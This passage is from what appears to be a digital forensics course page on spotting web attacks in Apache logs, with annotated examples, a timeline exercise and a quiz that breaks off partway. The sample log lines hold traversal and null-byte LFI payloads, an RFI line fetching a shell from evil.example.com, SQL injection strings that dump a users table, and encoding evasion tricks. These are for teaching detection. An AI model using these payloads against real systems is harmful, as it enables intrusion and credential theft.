+      <p><strong>Analysis:</strong> Four levels of <code>../</code> navigate from the application directory to the filesystem root. The <strong>200 status</strong> and <strong>1847-byte response</strong> (consistent with a typical <code>/etc/passwd</code> file) strongly suggest the traversal succeeded and the file contents were returned.</p>
+
+      <h4>Annotated Example: LFI with Null Byte</h4>
+<pre><span class="hl-ip">10.0.0.99</span> - - <span class="hl-date">[15/Apr/2026:10:19:11 -0700]</span> <span class="hl-method">"GET</span> <span class="hl-uri">/cms/index.php?page=<span class="hl-attack">../../../etc/passwd%00</span></span> <span class="hl-method">HTTP/1.1"</span> <span class="hl-status">200</span> <span class="hl-size">2103</span> <span class="hl-ref">"-"</span> <span class="hl-ua">"Mozilla/5.0"</span></pre>
+      <p><strong>Analysis:</strong> The <code>page</code> parameter is being exploited for LFI. The <code>%00</code> null byte at the end truncates whatever extension (e.g., <code>.php</code>) the application would normally append, allowing <code>/etc/passwd</code> to be included directly. This technique works on older PHP versions (before 5.3.4).</p>
+
+      <h4>Annotated Example: Remote File Inclusion (RFI)</h4>
+<pre><span class="hl-ip">10.0.0.99</span> - - <span class="hl-date">[15/Apr/2026:10:20:03 -0700]</span> <span class="hl-method">"GET</span> <span class="hl-uri">/cms/index.php?page=<span class="hl-attack">http://evil.example.com/shell.txt</span></span> <span class="hl-method">HTTP/1.1"</span> <span class="hl-status">200</span> <span class="hl-size">58</span> <span class="hl-ref">"-"</span> <span class="hl-ua">"Mozilla/5.0"</span></pre>
+      <p><strong>Analysis:</strong> The <code>page</code> parameter contains a full external URL. If the server's PHP configuration has <code>allow_url_include</code> enabled, the remote file will be fetched and executed as PHP code. The small response size (58 bytes) may indicate a web shell confirmation message. This is a <strong>critical severity</strong> finding—RFI typically leads to full server compromise.</p>
+
+      <div class="callout warning">
+        <p class="callout-title"><span class="icon" aria-hidden="true">⚠️</span> Encoding Evasion</p>
+        <p>Attackers use multiple encoding layers to evade detection: <code>..%252f</code> (double URL encoding), <code>....//</code> (nested traversal that survives single-pass stripping), and Unicode variants like <code>%c0%af</code>. Always normalize and decode URIs before pattern matching.</p>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ── 3d Brute Force ── -->
+<div class="acc-item">
+  <button class="acc-btn" aria-expanded="false" aria-controls="panel-brute" id="btn-brute">
+    <span>3.4 Brute-Force and Credential-Stuffing Attacks</span>
+    <span class="chevron" aria-hidden="true">▼</span>
+  </button>
+  <div class="acc-panel" id="panel-brute" role="region" aria-labelledby="btn-brute">
+    <div class="acc-panel-inner">
+      <h4>What It Is</h4>
+      <p>Brute-force attacks involve repeated login attempts using different username/password combinations. Credential stuffing is a variant that uses username-password pairs leaked from other breaches. These attacks target login endpoints and produce distinctive log patterns.</p>
+
+      <h4>Log Signatures to Search For</h4>
+      <ul>
+        <li>High volume of <code>POST</code> requests to login endpoints (<code>/login</code>, <code>/wp-login.php</code>, <code>/admin</code>, <code>/auth</code>)</li>
+        <li>Repeated <strong>401</strong> or <strong>403</strong> status codes from a single IP or small IP range</li>
+        <li>Consistent small response sizes (indicating identical error pages)</li>
+        <li>Rapid request rate — multiple requests per second to the same endpoint</li>
+        <li>A sudden <strong>302 redirect</strong> or <strong>200 OK</strong> with a <em>different response size</em> after many failures — indicates potential success</li>
+        <li>Rotating User-Agent strings from the same IP (tool trying to appear as different browsers)</li>
+      </ul>
+
+      <h4>Annotated Example: Brute-Force Sequence</h4>
+<pre><span class="hl-comment"># Repeated failed attempts — note identical status and response size</span>
+<span class="hl-ip">10.0.0.99</span> - - <span class="hl-date">[15/Apr/2026:10:22:01 -0700]</span> <span class="hl-method">"POST</span> <span class="hl-uri">/admin/login</span> <span class="hl-method">HTTP/1.1"</span> <span class="hl-status">401</span> <span class="hl-size">523</span> <span class="hl-ref">"-"</span> <span class="hl-ua">"<span class="hl-attack">Hydra/9.4</span>"</span>
+<span class="hl-ip">10.0.0.99</span> - - <span class="hl-date">[15/Apr/2026:10:22:01 -0700]</span> <span class="hl-method">"POST</span> <span class="hl-uri">/admin/login</span> <span class="hl-method">HTTP/1.1"</span> <span class="hl-status">401</span> <span class="hl-size">523</span> <span class="hl-ref">"-"</span> <span class="hl-ua">"<span class="hl-attack">Hydra/9.4</span>"</span>
+<span class="hl-ip">10.0.0.99</span> - - <span class="hl-date">[15/Apr/2026:10:22:02 -0700]</span> <span class="hl-method">"POST</span> <span class="hl-uri">/admin/login</span> <span class="hl-method">HTTP/1.1"</span> <span class="hl-status">401</span> <span class="hl-size">523</span> <span class="hl-ref">"-"</span> <span class="hl-ua">"<span class="hl-attack">Hydra/9.4</span>"</span>
+<span class="hl-comment"># Potential success — status changes to 302, response size differs</span>
+<span class="hl-ip">10.0.0.99</span> - - <span class="hl-date">[15/Apr/2026:10:22:03 -0700]</span> <span class="hl-method">"POST</span> <span class="hl-uri">/admin/login</span> <span class="hl-method">HTTP/1.1"</span> <span class="hl-status"><span class="hl-attack">302</span></span> <span class="hl-size"><span class="hl-attack">0</span></span> <span class="hl-ref">"-"</span> <span class="hl-ua">"Hydra/9.4"</span></pre>
+      <p><strong>Analysis:</strong></p>
+      <ul>
+        <li>Multiple <code>POST</code> requests to <code>/admin/login</code> within the same second — far faster than human typing.</li>
+        <li>The <code>Hydra/9.4</code> User-Agent identifies THC Hydra, a well-known password-cracking tool.</li>
+        <li>Three consecutive <strong>401</strong> responses with identical 523-byte bodies indicate failed login attempts.</li>
+        <li>The fourth request returns a <strong>302 redirect</strong> with a 0-byte body (the redirect itself has no content). This status change strongly suggests the attacker found valid credentials.</li>
+        <li>The forensic examiner should immediately check what resources were accessed <em>after</em> this 302 to determine the scope of the compromise.</li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+<!-- ── 3e Scanner Signatures ── -->
+<div class="acc-item">
+  <button class="acc-btn" aria-expanded="false" aria-controls="panel-scanner" id="btn-scanner">
+    <span>3.5 Automated Scanner Signatures</span>
+    <span class="chevron" aria-hidden="true">▼</span>
+  </button>
+  <div class="acc-panel" id="panel-scanner" role="region" aria-labelledby="btn-scanner">
+    <div class="acc-panel-inner">
+      <h4>What It Is</h4>
+      <p>Vulnerability scanners and web application assessment tools probe servers for known vulnerabilities, default files, backup files, and configuration weaknesses. They typically generate a large volume of requests in a short time and target well-known paths. Identifying scanner activity establishes the <strong>reconnaissance phase</strong> of an attack timeline.</p>
+
+      <h4>Log Signatures to Search For</h4>
+      <ul>
+        <li><strong>Known tool User-Agents:</strong> <code>Nikto</code>, <code>DirBuster</code>, <code>Gobuster</code>, <code>wfuzz</code>, <code>Nessus</code>, <code>OpenVAS</code>, <code>Acunetix</code>, <code>ZAP</code>, <code>Burp</code>, <code>w3af</code></li>
+        <li><strong>Rapid 404 sequences:</strong> Hundreds of requests to non-existent paths in seconds</li>
+        <li><strong>Common probe paths:</strong> <code>/robots.txt</code>, <code>/.env</code>, <code>/wp-admin/</code>, <code>/phpmyadmin/</code>, <code>/admin/</code>, <code>/.git/config</code>, <code>/backup.zip</code>, <code>/server-status</code>, <code>/web.config</code>, <code>/.htaccess</code></li>
+        <li><strong>Sequential enumeration patterns:</strong> Alphabetical or wordlist-ordered path requests</li>
+        <li><strong>HTTP method probing:</strong> <code>OPTIONS</code>, <code>TRACE</code>, <code>PUT</code>, <code>DELETE</code> requests</li>
+        <li><strong>Absence of Referer:</strong> Scanners rarely set a Referer header</li>
+      </ul>
+
+      <h4>Annotated Example: Nikto Scan</h4>
+<pre><span class="hl-ip">10.0.0.99</span> - - <span class="hl-date">[15/Apr/2026:10:10:01 -0700]</span> <span class="hl-method">"GET</span> <span class="hl-uri"><span class="hl-attack">/robots.txt</span></span> <span class="hl-method">HTTP/1.1"</span> <span class="hl-status">200</span> <span class="hl-size">312</span> <span class="hl-ref">"-"</span> <span class="hl-ua">"<span class="hl-attack">Mozilla/5.00 (Nikto/2.5.0)</span>"</span>
+<span class="hl-ip">10.0.0.99</span> - - <span class="hl-date">[15/Apr/2026:10:10:01 -0700]</span> <span class="hl-method">"GET</span> <span class="hl-uri"><span class="hl-attack">/.env</span></span> <span class="hl-method">HTTP/1.1"</span> <span class="hl-status">403</span> <span class="hl-size">199</span> <span class="hl-ref">"-"</span> <span class="hl-ua">"Mozilla/5.00 (Nikto/2.5.0)"</span>
+<span class="hl-ip">10.0.0.99</span> - - <span class="hl-date">[15/Apr/2026:10:10:01 -0700]</span> <span class="hl-method">"GET</span> <span class="hl-uri"><span class="hl-attack">/phpmyadmin/</span></span> <span class="hl-method">HTTP/1.1"</span> <span class="hl-status">404</span> <span class="hl-size">196</span> <span class="hl-ref">"-"</span> <span class="hl-ua">"Mozilla/5.00 (Nikto/2.5.0)"</span>
+<span class="hl-ip">10.0.0.99</span> - - <span class="hl-date">[15/Apr/2026:10:10:02 -0700]</span> <span class="hl-method">"GET</span> <span class="hl-uri"><span class="hl-attack">/.git/config</span></span> <span class="hl-method">HTTP/1.1"</span> <span class="hl-status">200</span> <span class="hl-size">247</span> <span class="hl-ref">"-"</span> <span class="hl-ua">"Mozilla/5.00 (Nikto/2.5.0)"</span>
+<span class="hl-ip">10.0.0.99</span> - - <span class="hl-date">[15/Apr/2026:10:10:02 -0700]</span> <span class="hl-method">"GET</span> <span class="hl-uri"><span class="hl-attack">/server-status</span></span> <span class="hl-method">HTTP/1.1"</span> <span class="hl-status">403</span> <span class="hl-size">199</span> <span class="hl-ref">"-"</span> <span class="hl-ua">"Mozilla/5.00 (Nikto/2.5.0)"</span></pre>
+      <p><strong>Analysis:</strong></p>
+      <ul>
+        <li>Five requests in under two seconds targeting well-known sensitive paths — clearly automated.</li>
+        <li>The <code>Nikto/2.5.0</code> User-Agent explicitly identifies the scanner (not all attackers are this careless—some spoof the UA).</li>
+        <li>No Referer header on any request (all show <code>"-"</code>).</li>
+        <li><strong>Critical finding:</strong> <code>/.git/config</code> returned a <strong>200 OK</strong> with 247 bytes. This means the Git repository configuration is exposed, potentially allowing the attacker to download the entire source code. This should be flagged as a high-priority finding.</li>
+        <li>The mix of 200, 403, and 404 responses is typical of scanning—the attacker is probing broadly and noting which resources exist.</li>
+      </ul>
+
+      <div class="callout tip">
+        <p class="callout-title"><span class="icon" aria-hidden="true">💡</span> Spoofed User-Agents</p>
+        <p>Sophisticated attackers change their User-Agent to mimic legitimate browsers. When the UA looks normal, rely on <strong>behavioral indicators</strong>: request rate, sequential path patterns, lack of Referer, lack of associated asset requests (CSS, JS, images), and targeting of known sensitive paths.</p>
+      </div>
+    </div>
+  </div>
+</div>
+
+</div><!-- /accordion -->
+</section>
+
+<!-- ════════════════════════ §5 CORRELATION ════════════════════════ -->
+<section id="correlation" aria-labelledby="corr-heading">
+<h2 id="corr-heading">4. Correlating Web Logs with Other Evidence</h2>
+<p>Web server logs are rarely analyzed in isolation. Effective forensic analysis requires correlating log data with other evidence sources to build a comprehensive picture of an incident.</p>
+
+<h3>4.1 IP Address Correlation</h3>
+<p>When you identify a suspicious IP address in web logs:</p>
+<ul>
+  <li><strong>Firewall logs:</strong> Confirm the connection was established; check for other ports/services the same IP accessed.</li>
+  <li><strong>DHCP logs:</strong> If the IP is internal, map it to a specific host and user via DHCP lease records.</li>
+  <li><strong>DNS logs:</strong> Check if the IP performed DNS lookups that reveal additional reconnaissance targets.</li>
+  <li><strong>IDS/IPS alerts:</strong> Correlate with any intrusion detection alerts triggered by the same source IP.</li>
+  <li><strong>WHOIS / GeoIP:</strong> For external IPs, determine the registrant organization, ASN, and geographic location. Note that attackers frequently use VPNs, proxies, and compromised hosts.</li>
+</ul>
+
+<h3>4.2 Timestamp Correlation and Normalization</h3>
+<p>Timestamps are the glue that binds evidence from different sources into a coherent timeline. Critical steps:</p>
+<ol>
+  <li><strong>Verify timezone configuration</strong> on each log source. Apache logs include the UTC offset (e.g., <code>-0700</code>); IIS logs default to UTC.</li>
+  <li><strong>Normalize all timestamps to UTC</strong> before correlating across sources. A one-hour timezone mismatch can make events appear to happen in the wrong order.</li>
+  <li><strong>Check NTP synchronization</strong> — if a server's clock was drifting, timestamps may be offset by seconds or minutes. Look for NTP configuration and logs.</li>
+  <li><strong>Account for log rotation</strong> — ensure you have the complete set of log files covering the incident window.</li>
+</ol>
+
+<h3>4.3 Building a Forensic Timeline</h3>
+<p>A forensic timeline arranges events from all evidence sources in chronological order. For a web attack investigation, the timeline typically reveals these phases:</p>
+
+<div class="table-wrap">
+<table>
+  <caption class="sr-only">Typical Web Attack Timeline Phases</caption>
+  <thead>
+    <tr><th>Phase</th><th>Log Indicators</th><th>Corroborating Evidence</th></tr>
+  </thead>
+  <tbody>
+    <tr><td><strong>1. Reconnaissance</strong></td><td>Scanner UA strings, rapid 404s, probes for <code>robots.txt</code>, <code>/.env</code>, admin paths</td><td>IDS alerts for port scans, DNS lookups from attacker IP</td></tr>
+    <tr><td><strong>2. Vulnerability Testing</strong></td><td>SQLi/XSS/traversal payloads in URIs, 400/500 status codes</td><td>WAF blocks, application error logs with stack traces</td></tr>
+    <tr><td><strong>3. Exploitation</strong></td><td>Successful payload (200 OK with anomalous response size), brute-force success (401→302 transition)</td><td>Database query logs showing injected SQL, authentication system logs</td></tr>
+    <tr><td><strong>4. Post-Exploitation</strong></td><td>Access to admin panels, file upload requests, requests to newly created files (web shells)</td><td>File system timeline showing new files, outbound connections from server</td></tr>
+    <tr><td><strong>5. Persistence / Exfiltration</strong></td><td>Repeated access to web shell, large response sizes (data download), unusual outbound requests</td><td>Netflow data showing outbound data transfers, cron/scheduled task modifications</td></tr>
+  </tbody>
+</table>
+</div>
+
+<div class="callout forensic">
+  <p class="callout-title"><span class="icon" aria-hidden="true">🔍</span> Forensic Note — Documentation</p>
+  <p>As you build a timeline, document each entry with: (1) the normalized UTC timestamp, (2) the source log file and line number, (3) the event description, and (4) your interpretation of its significance. This documentation trail is essential for producing a defensible forensic report, which you will practice in the Week 14 capstone project.</p>
+</div>
+</section>
+
+<!-- ════════════════════════ §6 MINI-CASE ════════════════════════ -->
+<section id="mini-case" aria-labelledby="case-heading">
+<h2 id="case-heading">5. Mini-Case: Web Attack Timeline Exercise</h2>
+<p>The following 15 sanitized Apache Combined Log Format entries represent activity from a single IP address (<code>203.0.113.50</code>) against a web application server. The entries span approximately 12 minutes and show a complete attack progression.</p>
+<p><strong>Your task:</strong> Read each log line carefully, identify which <strong>attack phase</strong> it belongs to (Reconnaissance, Vulnerability Testing, Exploitation, or Post-Exploitation), and construct a timeline. Then reveal the model answer to check your analysis.</p>
+
+<div class="callout tip">
+  <p class="callout-title"><span class="icon" aria-hidden="true">💡</span> Approach</p>
+  <p>Read through all 15 lines first to get the big picture. Then go back and classify each one. Pay attention to: the URI path, any attack payloads, the HTTP status code, the response size, and the User-Agent string. Look for transitions between phases.</p>
+</div>
+
+<pre id="case-logs"><span class="hl-comment"># Line 1</span>
+<span class="hl-ip">203.0.113.50</span> - - <span class="hl-date">[15/Apr/2026:14:00:03 -0700]</span> <span class="hl-method">"GET</span> <span class="hl-uri">/robots.txt</span> <span class="hl-method">HTTP/1.1"</span> <span class="hl-status">200</span> <span class="hl-size">187</span> <span class="hl-ref">"-"</span> <span class="hl-ua">"Mozilla/5.00 (Nikto/2.5.0)"</span>
+
+<span class="hl-comment"># Line 2</span>
+<span class="hl-ip">203.0.113.50</span> - - <span class="hl-date">[15/Apr/2026:14:00:04 -0700]</span> <span class="hl-method">"GET</span> <span class="hl-uri">/admin/</span> <span class="hl-method">HTTP/1.1"</span> <span class="hl-status">403</span> <span class="hl-size">199</span> <span class="hl-ref">"-"</span> <span class="hl-ua">"Mozilla/5.00 (Nikto/2.5.0)"</span>
+
+<span class="hl-comment"># Line 3</span>
+<span class="hl-ip">203.0.113.50</span> - - <span class="hl-date">[15/Apr/2026:14:00:04 -0700]</span> <span class="hl-method">"GET</span> <span class="hl-uri">/phpmyadmin/</span> <span class="hl-method">HTTP/1.1"</span> <span class="hl-status">404</span> <span class="hl-size">196</span> <span class="hl-ref">"-"</span> <span class="hl-ua">"Mozilla/5.00 (Nikto/2.5.0)"</span>
+
+<span class="hl-comment"># Line 4</span>
+<span class="hl-ip">203.0.113.50</span> - - <span class="hl-date">[15/Apr/2026:14:00:05 -0700]</span> <span class="hl-method">"GET</span> <span class="hl-uri">/.env</span> <span class="hl-method">HTTP/1.1"</span> <span class="hl-status">200</span> <span class="hl-size">423</span> <span class="hl-ref">"-"</span> <span class="hl-ua">"Mozilla/5.00 (Nikto/2.5.0)"</span>
+
+<span class="hl-comment"># Line 5</span>
+<span class="hl-ip">203.0.113.50</span> - - <span class="hl-date">[15/Apr/2026:14:00:05 -0700]</span> <span class="hl-method">"GET</span> <span class="hl-uri">/backup.sql</span> <span class="hl-method">HTTP/1.1"</span> <span class="hl-status">404</span> <span class="hl-size">196</span> <span class="hl-ref">"-"</span> <span class="hl-ua">"Mozilla/5.00 (Nikto/2.5.0)"</span>
+
+<span class="hl-comment"># Line 6</span>
+<span class="hl-ip">203.0.113.50</span> - - <span class="hl-date">[15/Apr/2026:14:03:22 -0700]</span> <span class="hl-method">"GET</span> <span class="hl-uri">/products/view?id=<span class="hl-attack">1'+OR+'1'='1</span></span> <span class="hl-method">HTTP/1.1"</span> <span class="hl-status">200</span> <span class="hl-size">8734</span> <span class="hl-ref">"-"</span> <span class="hl-ua">"<span class="hl-attack">sqlmap/1.7.5#stable</span>"</span>
+
+<span class="hl-comment"># Line 7</span>
+<span class="hl-ip">203.0.113.50</span> - - <span class="hl-date">[15/Apr/2026:14:03:45 -0700]</span> <span class="hl-method">"GET</span> <span class="hl-uri">/products/view?id=<span class="hl-attack">1+UNION+SELECT+NULL,NULL,NULL--</span></span> <span class="hl-method">HTTP/1.1"</span> <span class="hl-status">500</span> <span class="hl-size">842</span> <span class="hl-ref">"-"</span> <span class="hl-ua">"sqlmap/1.7.5#stable"</span>
+
+<span class="hl-comment"># Line 8</span>
+<span class="hl-ip">203.0.113.50</span> - - <span class="hl-date">[15/Apr/2026:14:04:02 -0700]</span> <span class="hl-method">"GET</span> <span class="hl-uri">/products/view?id=<span class="hl-attack">1+UNION+SELECT+NULL,NULL,NULL,NULL--</span></span> <span class="hl-method">HTTP/1.1"</span> <span class="hl-status">200</span> <span class="hl-size">4210</span> <span class="hl-ref">"-"</span> <span class="hl-ua">"sqlmap/1.7.5#stable"</span>
+
+<span class="hl-comment"># Line 9</span>
+<span class="hl-ip">203.0.113.50</span> - - <span class="hl-date">[15/Apr/2026:14:04:38 -0700]</span> <span class="hl-method">"GET</span> <span class="hl-uri">/products/view?id=<span class="hl-attack">1+UNION+SELECT+username,password,email,role+FROM+users--</span></span> <span class="hl-method">HTTP/1.1"</span> <span class="hl-status">200</span> <span class="hl-size">12847</span> <span class="hl-ref">"-"</span> <span class="hl-ua">"sqlmap/1.7.5#stable"</span>
+
+<span class="hl-comment"># Line 10</span>
+<span class="hl-ip">203.0.113.50</span> - - <span class="hl-date">[15/Apr/2026:14:07:15 -0700]</span> <span class="hl-method">"POST</span> <span class="hl-uri">/admin/login</span> <span class="hl-method">HTTP/1.1"</span> <span class="hl-status">302</span> <span class="hl-size">0</span> <span class="hl-ref">"-"</span> <span class="hl-ua">"Mozilla/5.0 (X11; Linux x86_64)"</span>
+
+<span class="hl-comment"># Line 11</span>
+<span class="hl-ip">203.0.113.50</span> - - <span class="hl-date">[15/Apr/2026:14:07:16 -0700]</span> <span class="hl-method">"GET</span> <span class="hl-uri">/admin/dashboard</span> <span class="hl-method">HTTP/1.1"</span> <span class="hl-status">200</span> <span class="hl-size">15320</span> <span class="hl-ref">"-"</span> <span class="hl-ua">"Mozilla/5.0 (X11; Linux x86_64)"</span>
+
+<span class="hl-comment"># Line 12</span>
+<span class="hl-ip">203.0.113.50</span> - - <span class="hl-date">[15/Apr/2026:14:08:44 -0700]</span> <span class="hl-method">"GET</span> <span class="hl-uri">/admin/users</span> <span class="hl-method">HTTP/1.1"</span> <span class="hl-status">200</span> <span class="hl-size">23891</span> <span class="hl-ref">"/admin/dashboard"</span> <span class="hl-ua">"Mozilla/5.0 (X11; Linux x86_64)"</span>
+
+<span class="hl-comment"># Line 13</span>
+<span class="hl-ip">203.0.113.50</span> - - <span class="hl-date">[15/Apr/2026:14:09:30 -0700]</span> <span class="hl-method">"GET</span> <span class="hl-uri">/admin/settings</span> <span class="hl-method">HTTP/1.1"</span> <span class="hl-status">200</span> <span class="hl-size">9412</span> <span class="hl-ref">"/admin/dashboard"</span> <span class="hl-ua">"Mozilla/5.0 (X11; Linux x86_64)"</span>
+
+<span class="hl-comment"># Line 14</span>
+<span class="hl-ip">203.0.113.50</span> - - <span class="hl-date">[15/Apr/2026:14:10:55 -0700]</span> <span class="hl-method">"POST</span> <span class="hl-uri"><span class="hl-attack">/admin/upload</span></span> <span class="hl-method">HTTP/1.1"</span> <span class="hl-status">200</span> <span class="hl-size">87</span> <span class="hl-ref">"/admin/settings"</span> <span class="hl-ua">"Mozilla/5.0 (X11; Linux x86_64)"</span>
+
+<span class="hl-comment"># Line 15</span>
+<span class="hl-ip">203.0.113.50</span> - - <span class="hl-date">[15/Apr/2026:14:11:12 -0700]</span> <span class="hl-method">"GET</span> <span class="hl-uri"><span class="hl-attack">/uploads/shell.php</span></span> <span class="hl-method">HTTP/1.1"</span> <span class="hl-status">200</span> <span class="hl-size">63</span> <span class="hl-ref">"-"</span> <span class="hl-ua">"Mozilla/5.0 (X11; Linux x86_64)"</span></pre>
+
+<button class="reveal-btn" id="reveal-case-btn" aria-expanded="false" aria-controls="case-answer">Reveal Model Timeline &amp; Analysis</button>
+<div class="reveal-content" id="case-answer">
+  <h3>Model Timeline</h3>
+  <div class="table-wrap">
+  <table class="timeline-table">
+    <caption class="sr-only">Model attack timeline for mini-case exercise</caption>
+    <thead>
+      <tr><th>Line</th><th>Time (PDT)</th><th>Phase</th><th>Event Description</th></tr>
+    </thead>
+    <tbody>
+      <tr><td>1</td><td>14:00:03</td><td><strong>Reconnaissance</strong></td><td>Nikto scanner retrieves <code>robots.txt</code> to discover disallowed paths. 200 OK — file exists and was returned.</td></tr>
+      <tr><td>2</td><td>14:00:04</td><td><strong>Reconnaissance</strong></td><td>Scanner probes <code>/admin/</code> — receives 403 (Forbidden). Admin panel exists but is access-restricted.</td></tr>
+      <tr><td>3</td><td>14:00:04</td><td><strong>Reconnaissance</strong></td><td>Scanner probes <code>/phpmyadmin/</code> — 404 (Not Found). phpMyAdmin is not installed.</td></tr>
+      <tr><td>4</td><td>14:00:05</td><td><strong>Reconnaissance</strong></td><td><strong>Critical:</strong> Scanner retrieves <code>/.env</code> — <strong>200 OK, 423 bytes</strong>. The environment configuration file (containing database credentials, API keys) was exposed.</td></tr>
+      <tr><td>5</td><td>14:00:05</td><td><strong>Reconnaissance</strong></td><td>Scanner probes for <code>/backup.sql</code> — 404. No backup file at this path.</td></tr>
+      <tr><td>6</td><td>14:03:22</td><td><strong>Vuln. Testing</strong></td><td>Three-minute gap. Attacker switches to <code>sqlmap</code> and tests boolean-based SQLi (<code>OR '1'='1</code>) on the <code>id</code> parameter. The <strong>200 OK with 8734 bytes</strong> (larger than normal) suggests the tautology returned extra records.</td></tr>
+      <tr><td>7</td><td>14:03:45</td><td><strong>Vuln. Testing</strong></td><td>UNION SELECT with 3 NULL columns — <strong>500 error</strong>. Column count mismatch caused a database error. The attacker is determining the correct number of columns.</td></tr>
+      <tr><td>8</td><td>14:04:02</td><td><strong>Vuln. Testing</strong></td><td>UNION SELECT with 4 NULL columns — <strong>200 OK</strong>. The query succeeded, confirming the table has 4 columns. The attacker now knows the column count.</td></tr>
+      <tr><td>9</td><td>14:04:38</td><td><strong>Exploitation</strong></td><td>UNION SELECT extracting <code>username, password, email, role</code> from <code>users</code> table — <strong>200 OK, 12847 bytes</strong>. The large response size strongly indicates the user database was successfully exfiltrated.</td></tr>
+      <tr><td>10</td><td>14:07:15</td><td><strong>Exploitation</strong></td><td>POST to <code>/admin/login</code> — <strong>302 redirect</strong>. Using credentials obtained from the SQLi dump, the attacker successfully authenticates to the admin panel. Note the UA changed to a standard browser string.</td></tr>
+      <tr><td>11</td><td>14:07:16</td><td><strong>Post-Exploitation</strong></td><td>Accesses admin dashboard — 200 OK, 15320 bytes. The attacker is now inside the admin area.</td></tr>
+      <tr><td>12</td><td>14:08:44</td><td><strong>Post-Exploitation</strong></td><td>Accesses <code>/admin/users</code> — 200 OK, 23891 bytes. Reviewing user accounts, possibly to identify high-privilege accounts or additional targets.</td></tr>
+      <tr><td>13</td><td>14:09:30</td><td><strong>Post-Exploitation</strong></td><td>Accesses <code>/admin/settings</code> — 200 OK. Reviewing application settings, likely looking for upload functionality.</td></tr>
+      <tr><td>14</td><td>14:10:55</td><td><strong>Post-Exploitation</strong></td><td><strong>Critical:</strong> POST to <code>/admin/upload</code> — 200 OK, 87 bytes. The small response suggests a success confirmation message. The attacker uploaded a file through the admin interface.</td></tr>
+      <tr><td>15</td><td>14:11:12</td><td><strong>Post-Exploitation</strong></td><td><strong>Critical:</strong> GET request to <code>/uploads/shell.php</code> — <strong>200 OK, 63 bytes</strong>. The attacker accesses the uploaded file, which is named <code>shell.php</code> — a web shell. The 63-byte response is consistent with a shell command prompt. The server is now fully compromised.</td></tr>
+    </tbody>
+  </table>
+  </div>
+
+  <h3>Summary of Findings</h3>
+  <ol>
+    <li><strong>Attack duration:</strong> ~11 minutes (14:00:03 to 14:11:12)</li>
+    <li><strong>Attack phases identified:</strong> Reconnaissance → Vulnerability Testing → Exploitation → Post-Exploitation</li>
+    <li><strong>Tools used:</strong> Nikto (scanning), sqlmap (SQL injection), standard browser (post-exploitation)</li>
+    <li><strong>Critical exposures exploited:</strong> Exposed <code>.env</code> file (Line 4), SQL injection in <code>id</code> parameter (Lines 6–9), unrestricted file upload (Line 14)</li>
+    <li><strong>Data compromised:</strong> Environment configuration file, entire users table (usernames, passwords, emails, roles)</li>
+    <li><strong>Persistence established:</strong> Web shell uploaded to <code>/uploads/shell.php</code> (Line 14–15)</li>
+    <li><strong>Recommended next steps:</strong> Isolate the server, preserve all logs, image the filesystem, check for additional web shells, reset all credentials, review <code>.env</code> contents for leaked secrets, notify affected users.</li>
+  </ol>
+</div>
+</section>
+
+<!-- ════════════════════════ §7 KNOWLEDGE CHECK ════════════════════════ -->
+<section id="knowledge-check" aria-labelledby="kc-heading">
+<h2 id="kc-heading">6. Knowledge Check</h2>
+<p>Test your understanding with these three ungraded questions. Select your answer and click <strong>Check Answer</strong> to receive immediate feedback.</p>
+
+<!-- Question 1 -->
+<div class="kc-question" id="kc-q1">
+  <p class="q-stem">1. An examiner reviewing Apache access logs sees 47 requests from IP 198.51.100.12 within 3 seconds. All target different paths such as <code>/admin/</code>, <code>/.env</code>, <code>/wp-login.php</code>, and <code>/phpmyadmin/</code>. Most return 404 status codes. What attack phase does this activity most likely represent?</p>
+  <ul class="kc-options" role="radiogroup" aria-label="Question 1 options">
+    <li><label><input type="radio" name="q1" value="a"> a) SQL injection exploitation</label></li>
+    <li><label><input type="radio" name="q1" value="b"> b) Automated reconnaissance / scanning</label></li>
+    <li><label><input type="radio" name="q1" value="c"> c) Brute-force authentication attack</label></li>
+    <li><label><input type="radio" name="q1" value="d"> d) Cross-site scripting (XSS) testing</label></li>
+  </ul>
+  <button class="kc-submit" data-question="q1" data-correct="b">Check Answer</button>
+  <div class="kc-feedback correct" id="q1-correct" role="alert">
+    <strong>✓ Correct!</strong> The high request rate, diverse target paths (known default/sensitive locations), and predominance of 404 responses are hallmarks of automated vulnerability scanning — the reconnaissance phase. The attacker is probing the server to discover what exists before launching targeted attacks.
+  </div>
+  <div class="kc-feedback incorrect" id="q1-incorrect" role="alert">
+    <strong>✗ Not quite.</strong> The correct answer is <strong>(b) Automated reconnaissance / scanning</strong>. The key indicators are: (1) 47 requests in 3 seconds — far too fast for manual activity, (2) targeting many different well-known paths rather than a single endpoint, and (3) mostly 404 responses indicating the attacker is probing for resources that may or may not exist. SQLi and XSS target specific parameters; brute-force targets a single login endpoint repeatedly.
+  </div>
+</div>
+
+<!-- Question 2 -->
+<div class="kc-question" id="kc-q2">
+  <p class="q-stem">2. Consider this log entry:<br>
+  <code>10.0.0.77 - - [15/Apr/2026:11:45:22 -0700] "GET /page.php?file=../../../../etc/passwd%00 HTTP/1.1" 200 1847 "-" "Mozilla/5.0"</code><br>
+  Which attack technique is being used, and what is the purpose of <code>%00</code> at the end of the path?</p>
+  <ul class="kc-options" role="radiogroup" aria-label="Question 2 options">
+    <li><label><input type="radio" name="q2" value="a"> a) SQL injection; <code>%00</code> is a SQL comment character</label></li>
+    <li><label><input type="radio" name="q2" value="b"> b) Remote File Inclusion; <code>%00</code> signals the end of the remote URL</label></li>
+    <li><label><input type="radio" name="q2" value="c"> c) Local File Inclusion with null byte injection; <code>%00</code> truncates a file extension the application would otherwise append</label></li>
+    <li><label><input type="radio" name="q2" value="d"> d) Cross-site scripting; <code>%00</code> is used to bypass input validation filters</label></li>
+  </ul>
+  <button class="kc-submit" data-question="q2" data-correct="c">Check Answer</button>
+  <div class="kc-feedback correct" id="q2-correct" role="alert">
+    <strong>✓ Correct!</strong> This is a Local File Inclusion (LFI) attack combined with null byte injection. The <code>../../../../</code> sequences traverse up to the root directory, and <code>%00</code> (URL-encoded null byte) causes the underlying C string functions to terminate the string at that point, effectively removing any file extension (like <code>.php</code>) that the application would normally append. The 200 status and 1847-byte response size suggest the <code>/etc/passwd</code> file was successfully retrieved.
+  </div>
+  <div class="kc-feedback incorrect" id="q2-incorrect" role="alert">
